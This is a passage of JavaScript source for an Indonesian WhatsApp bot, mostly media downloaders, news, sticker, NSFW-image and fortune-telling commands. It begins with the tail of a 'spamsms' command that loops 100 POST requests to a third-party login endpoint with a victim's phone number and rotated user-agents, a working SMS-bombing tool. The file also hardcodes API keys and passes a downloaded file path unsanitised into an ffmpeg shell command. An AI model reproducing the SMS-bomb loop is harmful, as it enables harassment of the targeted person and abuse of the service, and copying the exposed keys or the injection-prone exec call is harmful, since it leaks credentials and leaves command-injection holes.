AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"]
let ua = mal[Math.floor(Math.random() * mal.length)];
let axios = require('axios').default;
let hd = {
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
};
const dat = {
'phone': nosms
};
for (let x = 0; x < 100; x++) {
axios.post('https://api.myfave.com/api/fave/v1/auth', dat, {
headers: hd
}).then(res => {
console.log(res);
}).catch(err => {
console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS) BY len MODS`);
});
}
} else reply(`Penggunaan spamsms nomor/reply pesan target*\nContoh spamsms +6283829814737`)
reply(`spam sms/call akan di kirim ke no target`)
}
break

case 'yts': case 'ytsearch': {
if (isBan) return reply('*Kamu Di Ban Owner*')
if (!text) reply `❄️️ *Contoh : ${prefix + command} Kamiya*`
let search = await yts(text)
let teks = '❄️️ *YouTube Search*\n\n🎁 *Result From : '+text+'*\n\n'
let no = 1
for (let i of search.all) {
teks += `❄️️ *Nomor : ${no++}*\n⨠ Type : ${i.type}\n⨠ Video ID : ${i.videoId}\n⨠ Title : ${i.title}\n⨠ Views : ${i.views}\n⨠ Duration : ${i.timestamp}\n⨠ Upload At : ${i.ago}\n⨠ Url : ${i.url}\n\n─────────────────\n\n`
}
lenwy.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
}
break

case 'infogempa':
                let lenigp = await fetchJson(`https://api.lolhuman.xyz/api/infogempa?apikey=haikalgans`)
                reply('❄️️ *Sabar Yaa*')
                var caption = `❄️️ *Lokasi : ${lenigp.result.lokasi}*\n\n`
                caption += `⨠ *Waktu : ${lenigp.result.waktu}*\n`
                caption += `⨠ *Potensi : ${lenigp.result.potensi}*\n`
                caption += `⨠ *Magnitude : ${lenigp.result.magnitude}*\n`
                caption += `⨠ *Kedalaman : ${lenigp.result.kedalaman}*\n`
                caption += `⨠ *Koordinat : ${lenigp.result.koordinat}*`
                await lenwy.sendMessage(m.chat, {
                    image: {
                        url: lenigp.result.map
                    },
                    caption
                }, {
                    quoted: m
                })
                break

case 'play':
case 'song': {
if (isBan) return reply('*Kamu Di Ban Owner*')
if (!text) return reply(`❄️️ *Contoh: ${prefix + command} Boa - Duvet*`)
LenwyLD()
let res = await yts(text)
let url = res.all;
let result = url[Math.floor(Math.random() * url.length)]
teks = `❄️️ *Playing*
⨠ *Judul : ${result.title}*
⨠ *Upload : ${result.ago}*
⨠ *Url : ${result.url}*

▢ *Audio Akan Dikirim Dalam 1 - 5 Menit*
`
lenwy.sendMessage(m.chat, { image: { url: result.thumbnail },  caption: teks }, { quoted: m })
await downloadMp3(result.url)
}
break

case 'ytmp3': case 'youtubemp3': {
if (isBan) return reply('*Kamu Di Ban Owner*')
if (!q) return reply(`❄️️ *Kirim Link Youtube*`)
await LenwyLD ()
downloadMp3(text)
}
break

case 'git': case 'gitclone':
if (isBan) return reply('*Kamu Di Ban Owner*')
                if (!args[0]) return reply(`Mana link nya?`)
                if (!isUrl(args[0]) && !args[0].includes('github.com')) return reply(`Link invalid!! 🤔`)
                LenwyLD()
                let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
                let [, user, repo] = args[0].match(regex1) || []
                repo = repo.replace(/.git$/, '')
                let url = `https://api.github.com/repos/${user}/${repo}/zipball`
                let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
                lenwy.sendMessage(m.chat, { document: { url: url }, fileName: filename, mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply(mess.error))
            .catch(console.error)
            break

case 'tt':
case 'tiktok': {
if (isBan) return reply('*Kamu Di Ban Owner*')
			if (args.length == 0) return reply(`❄️️ *Contoh: ${prefix + command} Link Kamu*`)
			LenwyLD()
			let res = await tiktok2(`${args[0]}`)
				lenwy.sendMessage(m.chat, { video: { url: res.no_watermark }, fileName: `tiktok.mp4`, mimetype: 'video/mp4' }).then(() => {
				lenwy.sendMessage(m.chat, { audio: { url: res.music }, fileName: `tiktok.mp3`, mimetype: 'audio/mp4' })
			})
			}
			break

case 'tiktokht':
case 'tthastag':
case 'ttsearch': {
if (isBan) return reply('*Kamu Di Ban Owner*')
			if (args.length == 0) return reply(`❄️️ *Contoh: ${prefix + command} Ohto Ai Edit*`)
			LenwyLD()
			try {
    let res = await tiktoks(`${args[0]}`)
      lenwy.sendMessage(m.chat, { video: { url: res.no_watermark }, caption: res.title, mimetype: 'video/mp4' })
  } catch (e) {
    reply(`Terjadi Kesalahan, Tidak Dapat Mengambil Data Dari API !`);
  }
  }
break

case 'ttslide':
case 'tiktokslide': {
if (isBan) return reply('*Kamu Di Ban Owner*')
			if (args.length == 0) return reply(`❄️️ *Contoh: ${prefix + command} Link Kamu*`)
			if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
			LenwyLD()
			const limit = parseInt(args[0]) || 9;
			try {
    const allImages = [];
    let res = await fetch(`https://vihangayt.me/download/tiktokimg?url=${args[0]}`);
    let json = await res.json();
    if (json.data.length > 0) {
      allImages.push(...json.data);
    }
    const validImages = await filterValidImages(allImages, limit);
    for (const image of validImages) {
      lenwy.sendMessage(m.chat, { image: { url: image }})
    }
  } catch (e) {
    reply(`Terjadi Kesalahan, Tidak Dapat Mengambil Data Dari API !`);
  }
			/*axios.get(`https://vihangayt.me/download/tiktokimg?url=${args[0]}`).then(({ data }) => {
			ttslide(q).then( data => {
				lenwy.sendMessage(m.chat, { image: { url: data.imgSrc[0] }})
			})*/
			}
			break
			
case 'tiktokmp3':
if (isBan) return reply('*Kamu Di Ban Owner*')
			if (args.length == 0) return reply(`❄️️ *Contoh: ${prefix + command} Link Kamu*`)
			LenwyLD()
			axios.get(`https://vihangayt.me/download/tiktok2?url=${args[0]}`).then(({ data }) => {
				lenwy.sendMessage(m.chat, { audio: { url: data.data.mp3 }, fileName: `${data.data.title}.mp3`, mimetype: 'audio/mp4' })
			})
			.catch(console.error)
			break

case 'ig':
case 'igdl':
if (isBan) return reply('*Kamu Di Ban Owner*')
if (!q) return reply("❄️️ *Link?*")
LenwyLD()
try {
let res = await fetch(`https://vihangayt.me/download/instagram?url=${q}`)
let json = await res.json()
let cap = `*Instagram* 😋`
let con = json.data.data[0].type
let data = json.data.data[0].url
if (con.includes('video')) {
lenwy.sendMessage(m.chat, { video: { url: data }, caption: cap })
} else {
lenwy.sendMessage(m.chat, { image: { url: data }, caption: cap })
}
} catch (err) {
await reply(mess.error)
}
break

case 'igslide': {
                if (!q) return reply("❄️️ *Link?*")
                LenwyLD()
                let ag = await fetchJson(`https://api.lolhuman.xyz/api/instagram?apikey=haikalgans&url=${q}`)
                for (var i = 0; i < ag.result.length; i++) {
                    let pap = ag.result[i].includes('.jpg') ? 'image' : 'video'
                    await lenwy.sendMessage(m.chat, {
                        [pap]: {
                            url: ag.result[i]
                        },
                        caption: ''
                    }, {
                        quoted: m
                    })
                }
            }
            break

case 'yt': case 'ytmp4':
if (isBan) return reply('*Kamu Di Ban Owner*')
			if (args.length == 0) return reply(`❄️ *Contoh: ${prefix + command} Link Kamu*`)
			LenwyLD()
			axios.get(`https://vihangayt.me/download/ytmp4?url=${args[0]}`).then(({ data }) => {
				lenwy.sendMessage(m.chat, { video: { url: data.data.vid_360p }, mimetype: 'video/mp4' })
			})
			.catch(console.error)
			break

case 'mediafire':
if (isBan) return reply('*Kamu Di Ban Owner*')
                if (!q) return reply('❄️️ *Link Mediafirenya Mana?*')
                reply('❄️️ *Sabar Yaa*')
                let ha = await fetchJson(`https://api.lolhuman.xyz/api/mediafire?apikey=haikalgans&url=${q}`)
                lenwy.sendMessage(m.chat, {
                    document: {
                        url: ha.result.link
                    },
                    minetype: 'Lenwy'
                }, {
                    quoted: m
                })
                break

case "ssweb":{
if (!q) return reply(`❄️️ *Contoh ${prefix+command} Link Kamu*`)
reply(mess.wait)
global.sh = q
let krt = await ssweb(global.sh)
lenwy.sendMessage(from ,{ image: krt.result, caption: mess.success },{ quoted: m })
}
break

case 'wm': {
if (isBan) return reply('*Kamu Di Ban Owner*')
let teks = `${text}`
try {
 if (!quoted) reply `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await lenwy.sendImageAsSticker(from, media, m, { packname: `${teks}`, author: global.author })
await fs.unlinkSync(encmedia)
}
} catch (e) {
reply(mess.error)
}
}
break

case 'wmvideo2443417':{
if (isBan) return reply('*Kamu Di Ban Owner*')
let teks = `${text}`
try {
 if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
if (/video/.test(mime)) {
let media = await quoted.download()
let encmedia = await lenwy.sendVideoAsSticker(from, media, m, { packname: `${teks}`, author: author })
await fs.unlinkSync(encmedia)
} else {
reply `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
} catch (e) {
reply(mess.error)
}
}
break

case 'pin12346': case 'pinterest12346':{
if (isBan) return reply('*Kamu Di Ban Owner*')
if (!text) return reply(`❄️️ *Contoh ${prefix+command} Anime*`)
    if (global.db.data.users[m.sender].limit < 1) return reply('❄️️ *Limit Kamu Habis*') // respon ketika limit habis
                db.data.users[m.sender].limit -= 10
reply('❄️️ *10 Limit Digunakan*')
let anu = await pinterest(text)
let result = anu[Math.floor(Math.random() * anu.length)]
lenwy.sendMessage(m.chat, { image: { url: result }, caption: '❄️️ *Selesai*'}, { quoted: m })
}
break

case 'enka':
            case 'profilgi':
            if (isBan) return reply('*Kamu Di Ban Owner*')
			if (args.length == 0) return reply(`❄️️ *Contoh: ${prefix + command}* 800000001`)
            reply('❄️️ *Sabar Yaa*')
			global.sh = `https://enka.network/u/${args[0]}`
let krt = await ssweb(global.sh)
			axios.get(`https://enka.network/api/uid/${args[0]}?info`).then(({ data }) => {
				var caption = `❄️️ *Profile Genshin*\n\n ⨠ *Nickname* : *${data.playerInfo.nickname}*\n`
				caption += ` ⨠ *Adventure Rank* : *${data.playerInfo.level}*\n`
				caption += ` ⨠ *Signature* : *${data.playerInfo.signature}*\n`
				caption += ` ⨠ *World Level* : *${data.playerInfo.worldLevel}*\n\n`
				caption += ` ⨠ *Achievement* : *${data.playerInfo.finishAchievementNum}*\n`
				caption += ` ⨠ *Abyss* : *Floor ${data.playerInfo.towerFloorIndex} Chamber ${data.playerInfo.towerLevelIndex}*\n\n`
				caption += `🎁 *Lebih Lengkap Cek Disini :* https://enka.network/u/${args[0]}\n`
				lenwy.sendMessage(from ,{ image: krt.result, caption: caption },{ quoted: m })
			})
			.catch(console.error)
			break

case 'neko':
case 'waifu': {
if (isBan) return reply('*Kamu Di Ban Owner*')
let res = await fetch(`https://waifu.pics/api/sfw/${command}`)
let json = await res.json()
let cap = `*Sukses* 😋`
lenwy.sendMessage(from, {image: { url: json.url },caption:`*Alamak* 😋`},{ quoted:m }).catch(err => {
 return('Error!')
})
}
break

case 'loli2443417': {
if (isBan) return reply('*Kamu Di Ban Owner*')
lenwy.sendMessage(m.chat, { image: { url: `https://api.akuari.my.id/randomimganime/loli`}, caption: `*Nih Om* 😒`})
}
break

case 'cosplay': {
if (isBan) return reply('*Kamu Di Ban Owner*')
lenwy.sendMessage(m.chat, { image: { url: `https://api.akuari.my.id/randomimganime/cosplay`}, caption: `*Alamak* 😋`})
}
break

case 'ahegao':
			case 'yuri':
			case 'cum':
			case 'ero':
			case 'ass':
			case 'neko2':
			case 'okita':
			case 'umeko':
			case 'panties':
			case 'mihye':
			case 'merial':
			case 'quan':
			case 'nanaqi':
			case 'onlyfans':
			case 'onlyhestia':
			case 'nguyenhuang':
			case 'onlynoname': {
			if (db.data.chats[m.chat].nsfw) {
			if (isBan) return reply('*Kamu Di Ban Owner*')
                let anu = await fetchJson(`https://raw.githubusercontent.com/clicknetcafe/Databasee/main/nsfw/${command}.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                lenwy.sendMessage(m.chat, { image: { url: result}, caption: (mess.success) }, { quoted: len })
        }}
        break

            case 'hentaivid':
			case 'videobokep': {
			if (db.data.chats[m.chat].nsfw) {
			if (isBan) return reply('*Kamu Di Ban Owner*')
                let anu = await fetchJson(`https://raw.githubusercontent.com/clicknetcafe/Databasee/main/nsfw/${command}.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                lenwy.sendMessage(m.chat, { video: { url: result }, caption: (mess.success) }, { quoted: len })
        }}
        break

case 'animediff': {
if (isBan) return reply('*Kamu Di Ban Owner*')
if (!full_args) return reply('❄️️ *Contoh: Animediff Anime Girl, White Hair, Sided Bangs, Red Eyes, Gothic Drees*')
reply(mess.wait)
try {
let anu = await fetchJson(`https://vihangayt.me/tools/photoleap?q=${full_args}`)
lenwy.sendMessage(from, { image: { url: anu.data }, fileName: 'Lenwy.jpg' }, { quoted: m })
} catch (e) {
reply(mess.error)
}
}
break

case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': 
case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': 
case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': 
case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': 
case 'handhold':
if (isBan) return reply('*Kamu Di Ban Owner*')
 axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
lenwy.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
break

case "bucin": case "dare": case "faktaunik": case "fml": case "katabijak": case "katacinta": case "katagalau": case "katahacker": case "katailham": case "katasenja": case "katasindiran": case "motivasi": case "nickff": case "pantun": case "puisi": case "quotesislamic": case "quotespubg": case "truth": {
if (isBan) return reply('*Kamu Di Ban Owner*')
const t3xt = require(`./database/teks/${command}.json`)
const r4andT3xt = t3xt[Math.floor(Math.random() * t3xt.length)]
lenwy.sendMessage(from, { text: r4andT3xt }, { quoted: m })
}
break

case "quotes":
if (isBan) return reply('*Kamu Di Ban Owner*')
var resi = await Quotes()
teks = `\n❄️️ *Author: ${resi.author}*\n`
teks = `\n🎁 *Quotes:*\n`
teks = `❄️️ *${resi.quotes}*\n`
reply(teks)
break

case "quotesanime": {
if (isBan) return reply('*Kamu Di Ban Owner*')
const an1 = JSON.parse(fs.readFileSync("./data/quotesanime.json"))
const r4ndan1 = an1[Math.floor(Math.random() * an1.length)]
const tgt99 = `*❄️️ Random Quotes Anime*

❄️️ *Nama Anime : ${r4ndan1.anime}*
🍁 *Nama Character : ${r4ndan1.character}*
🍁 *Episode : ${r4ndan1.episode}*

🎁 *Quotes : ${r4ndan1.quotes}*`
lenwy.sendMessage(from, { text: tgt99 }, { quoted: len })
}
break

case 'kompasnews':
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
KompasNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n❄️️ *Berita ${no.toString()}*\n`
teks += `⨠ *Berita: ${i.berita}*\n`
teks += `⨠ *Upload: ${i.berita_diupload}*\n`
teks += `⨠ *Jenis: ${i.berita_jenis}*\n`
teks += `⨠ *Link:* ${i.berita_url}\n`
}
teks += ""
lenwy.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break

case 'detiknews':
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
DetikNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n❄️️ *Berita ${no.toString()}*\n`
teks += `⨠ *Berita: ${i.berita}*\n`
teks += `⨠ *Upload: ${i.berita_diupload}*\n`
teks += `⨠ *Link:* ${i.berita_url}\n`
}
teks += ""
lenwy.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break

case 'dailynews':
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
DailyNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n❄️️ *Berita ${no.toString()}*\n`
teks += `⨠ *Berita: ${i.berita}*\n`
teks += `⨠ *Link:* ${i.berita_url}\n`
}
teks += ""
lenwy.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break

case 'inews':
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
iNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n❄️️ *Berita ${no.toString()}*\n`
teks += `⨠ *Berita: ${i.berita}*\n`
teks += `⨠ *Upload: ${i.berita_diupload}*\n`
teks += `⨠ *Jenis: ${i.berita_jenis}*\n`
teks += `⨠ *Link:* ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break

case "kontan":
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
KontanNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n❄️️ *Berita ${no.toString()}*\n`
teks += `⨠ *Berita: ${i.berita}*\n`
teks += `⨠ *Jenis: ${i.berita_jenis}*\n`
teks += `⨠ *Link:* ${i.berita_url}\n`
}
teks += ""
lenwy.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break

case "meme":
var reis = await JalanTikusMeme()
teks = ""
teks += "❄️️ *Random Meme*\n\n"
teks += `🎁 *Source Meme :* ${reis}`
teks += ""
lenwy.sendMessage(m.chat, { image : { url : reis }, caption: teks }, { quoted:m })
break

case 'smeme':
if (isBan) return reply('*Kamu Di Ban Owner*')
 if (!text) reply `Balas Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
reply('❄️️ *Sabar Yaa*')
mee = await lenwy.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
kaytid = await getBuffer(`https://api.memegen.link/images/custom/-/${text}.png?background=${mem}`)
lenwy.sendImageAsSticker(m.chat, kaytid, m, { packname: global.packname, author: global.author })
}
break

break
case 'removebg':
case 'nobg': {
if (isBan) return reply('*Kamu Di Ban Owner*')
if (!isMedia) return reply("❄️️ *Kirim/Reply Gambar Dengan Caption Nobg*")
reply('❄️️ *Sabar Yaa*')
let media = await lenwy.downloadAndSaveMediaMessage(quoted)
let anu = await TelegraPh(media)
lenwy.sendMessage(m.chat, {
image: {
url: `https://api.lolhuman.xyz/api/removebg?apikey=haikalgans&img=${anu}`
},
caption: '✨ *Selesai*'
}, {
quoted: m
})
}
break

case 'toimage': case 'toimg': {
if (isBan) return reply('*Kamu Di Ban Owner*')
reply('❄️️ *Sabar Yaa*')
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) reply `Balas Sticker Dengan Caption ${prefix + command}`
let media = await lenwy.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
lenwy.sendMessage(from, { image: buffer }, {quoted:m})
fs.unlinkSync(ran)
})
}
break

case 'tomp4': case 'tovideo': {
if (isBan) return reply('*Kamu Di Ban Owner*')
reply('❄️️ *Sabar Yaa*')
if (!quoted) reply `Balas sticker video Dengan Caption ${prefix + command}`
if (/video/.test(mime)) {
let { webp2mp4File } = require('./lib/uploader')
let media = await lenwy.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await lenwy.sendMessage(from, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, {quoted:m})
await fs.unlinkSync(media)
}
}
break
case 'tomp3': {
if (!/video/.test(mime) && !/audio/.test(mime)) reply `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
reply('❄️️ *Sabar Yaa*')
if (!quoted) reply `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await lenwy.downloadMediaMessage(quoted)
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
lenwy.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${lenwy.user.name}.mp3`}, { quoted : m })
}
break

case 'toaudio2443417': case 'audio2443417': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
if (!/video/.test(mime) && !/audio/.test(mime)) reply `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) reply `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await lenwy.downloadMediaMessage(quoted)
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
lenwy.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
}
break

case 'tovn2443417': case 'voice2443417': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
if (!/video/.test(mime) && !/audio/.test(mime)) reply `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
if (!quoted) reply `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
reply('❄️️ *Sabar Yaa*')
let media = await quoted.download()
let { toPTT } = require('./lib/converter')
let audio = await toPTT(media, 'mp4')
lenwy.sendMessage(from, {audio: audio, mimetype:'audio/mpeg', ptt:true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://whatsapp.com/channel/0029VaEvOpP35fLtqPxd4F2L',
title: `©Project Kamiya汉 V3`,
sourceUrl: `https://whatsapp.com/channel/0029VaEvOpP35fLtqPxd4F2L`, 
thumbnail: thumb
}
}})
}
break

case 'togif': {
                if (isBan) return reply('*Kamu Di Ban Owner*')
                reply('❄️️ *Sabar Yaa*')
                if (!quoted) return reply('Reply video')
                if (!/webp/.test(mime)) return reply(`Balas Sticker Dengan Caption *${prefix + command}*`)
        let { webp2mp4File } = require('./lib/uploader')
                let media = await lenwy.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await lenwy.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break

case 'tourl': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
if (!/video/.test(mime) && !/image/.test(mime)) reply `*Send/Reply the Video/Image With Caption* ${prefix + command}`
if (!quoted) reply `*Send/Reply the Video/Image Caption* ${prefix + command}`
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
let media = await lenwy.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break

case 'emojimix': case 'emojimix': { 
if (isBan) return reply('*Kamu Di Ban Owner*')
let [emoji1, emoji2] = text.split`+`  
if (!emoji1) reply `Contoh : ${prefix + command} 😅+🤔`
if (!emoji2) reply `Contoh : ${prefix + command} 😅+🤔`
LenwyLD()
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await lenwy.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break

case 'artimimpi2443417': case 'tafsirmimpi2443417': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
 if (!text) reply `Contoh : ${prefix + command} belanja`
 let anu = await primbon.tafsir_mimpi(text)
 if (anu.status == false) return reply(anu.message)
 lenwy.sendText(from, `⨠ *Mimpi :* ${anu.message.mimpi}\n⨠ *Arti :* ${anu.message.arti}\n⨠ *Solusi :* ${anu.message.solusi}`, m)
}
break

case 'ramalanjodoh': case 'ramaljodoh': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
 if (!text) reply `Contoh : ${prefix + command} Kamiya, 3, 10, 2006, Nae, 5, 8, 2008`
 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
 let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
 if (anu.status == false) return reply(anu.message)
 lenwy.sendText(from, `⨠ *Nama Anda :* ${anu.message.nama_anda.nama}\n⨠ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⨠ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⨠ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⨠ *Hasil :* ${anu.message.result}\n⨠ *Catatan :* ${anu.message.catatan}`, m)
}
break

case 'artinama': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
 if (!text) reply `Contoh : ${prefix + command} Kamiya`
 let anu = await primbon.arti_nama(text)
 if (anu.status == false) return reply(anu.message)
 lenwy.sendText(from, `⨠ *Nama :* ${anu.message.nama}\n⨠ *Arti :* ${anu.message.arti}\n⨠ *Catatan :* ${anu.message.catatan}`, m)
}
break

case 'kecocokannama': case 'cocoknama': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
 if (!text) reply `Contoh : ${prefix + command} Kamiya, 3, 10, 2006`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 lenwy.sendText(from, `⨠ *Nama :* ${anu.message.nama}\n⨠ *Lahir :* ${anu.message.tgl_lahir}\n⨠ *Life Path :* ${anu.message.life_path}\n⨠ *Destiny :* ${anu.message.destiny}\n⨠ *Destiny Desire :* ${anu.message.destiny_desire}\n⨠ *Personality :* ${anu.message.personality}\n⨠ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
}
break

case 'kecocokanpasangan2443417': case 'cocokpasangan2443417': case 'pasangan2443417': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
 if (!text) reply `Contoh : ${prefix + command} Lenwy|Nae`
 let [nama1, nama2] = text.split`|`
 let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
 if (anu.status == false) return reply(anu.message)
 lenwy.sendImage(from,  anu.message.gambar, `⨠ *Nama Anda :* ${anu.message.nama_anda}\n⨠ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⨠ *Sisi Positif :* ${anu.message.sisi_positif}\n⨠ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
}
break

case 'jadianpernikahan2443417': case 'jadiannikah2443417': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
 if (!text) reply `Contoh : ${prefix + command} 6, 12, 2020`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 lenwy.sendText(from, `⨠ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⨠ *karakteristik :* ${anu.message.karakteristik}`, m)
}
break

case 'sifatusaha2443417': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
 if (!ext)reply `Contoh : ${prefix+ command} 28, 12, 2021`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 lenwy.sendText(from, `⨠ *Lahir :* ${anu.message.hari_lahir}\n⨠ *Usaha :* ${anu.message.usaha}`, m)
}
break

case 'rejeki2443417': case 'rezeki2443417': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
 if (!text) reply `Contoh : ${prefix + command} 5, 8, 2007`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 lenwy.sendText(from, `⨠ *Lahir :* ${anu.message.hari_lahir}\n⨠ *Rezeki :* ${anu.message.rejeki}\n⨠ *Catatan :* ${anu.message.catatan}`, m)
}
break

case 'pekerjaan2443417': case 'kerja2443417': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
 if (!text) reply `Contoh : ${prefix + command} 5, 8, 2007`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 lenwy.sendText(from, `⨠ *Lahir :* ${anu.message.hari_lahir}\n⨠ *Pekerjaan :* ${anu.message.pekerjaan}\n⨠ *Catatan :* ${anu.message.catatan}`, m)
}
break

case 'ramalannasib2443417': case 'ramalnasib2443417': case 'nasib2443417': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
 if (!text) reply `Contoh : 5, 8, 2007`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.ramalan_nasib(tgl, bln, thn)
